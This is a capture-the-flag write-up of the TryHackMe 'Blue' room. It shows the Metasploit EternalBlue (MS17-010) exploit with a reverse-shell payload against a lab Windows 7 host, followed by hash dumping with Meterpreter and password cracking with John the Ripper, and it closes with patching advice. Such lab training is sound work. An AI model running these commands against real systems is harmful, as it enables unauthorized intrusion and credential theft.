---
title: "Blue"
platform: tryhackme
difficulty: Easy
os: Windows
machine: Blue
date: 2025-10-20
tags: [windows, eternalblue, ms17-010, metasploit]
excerpt: "Exploiting the infamous EternalBlue (MS17-010) vulnerability on a Windows 7 machine to achieve SYSTEM-level access."
---

## Reconnaissance

```bash
nmap -sC -sV --script vuln -oN nmap/blue 10.10.x.x
```

```
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows 7 Professional 7601 SP1
3389/tcp  open  tcpwrapper

Host script results:
|_smb-vuln-ms17-010: VULNERABLE
```

Nmap's vulnerability scripts immediately flag **MS17-010 (EternalBlue)** — the infamous SMB vulnerability leaked from the NSA's toolset.

## Understanding EternalBlue

MS17-010 exploits a buffer overflow in the SMBv1 protocol on Windows systems. It was used in the WannaCry ransomware attack in May 2017 and remains one of the most impactful vulnerabilities in modern history.

The vulnerability exists in how Windows handles SMB transaction requests. By sending specially crafted packets, an attacker can achieve **remote code execution** at the SYSTEM level — no authentication required.

## Exploitation

Using Metasploit for a straightforward exploitation:

```bash
msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.10.x.x
set LHOST tun0
set payload windows/x64/shell/reverse_tcp
run
```

```
[*] Started reverse TCP handler on 10.10.14.5:4444
[*] 10.10.x.x:445 - Connecting to target...
[*] 10.10.x.x:445 - Connection established for exploitation
[+] 10.10.x.x:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.10.x.x:445 - CORE raw buffer dump (42 bytes)
[+] 10.10.x.x:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.x.x:445 - =-=   ETERNALBLUE  =-=
[+] 10.10.x.x:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[*] Command shell session 1 opened
```

We immediately get a **SYSTEM shell** — the highest privilege level on Windows.

## Post-Exploitation

### Checking privileges

```cmd
whoami
# nt authority\system
```

### Finding flags

```cmd
dir C:\Users /s /b | findstr flag
type C:\flag1.txt
type C:\Users\Jon\Documents\flag3.txt
```

### Dumping hashes

Upgrading to Meterpreter for credential extraction:

```bash
# In msfconsole, background the session
use post/multi/manage/shell_to_meterpreter
set SESSION 1
run

# In the new Meterpreter session
hashdump
```

```
Administrator:500:aad3b435...:31d6cfe0d...:::
Guest:501:aad3b435...:31d6cfe0d...:::
Jon:1000:aad3b435...:ffb43f0de6...:::
```

Cracking Jon's hash:

```bash
john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
# alqfna22
```

**All flags captured.** ✅

## Key Takeaways

- **Patch management is critical** — MS17-010 had a patch available months before WannaCry
- SMBv1 should be disabled on all modern Windows systems
- EternalBlue gives SYSTEM access directly — no privilege escalation needed
- This room demonstrates why vulnerability scanning (even with basic Nmap scripts) is essential
- In real engagements, always check for MS17-010 on Windows networks — it's still found in the wild
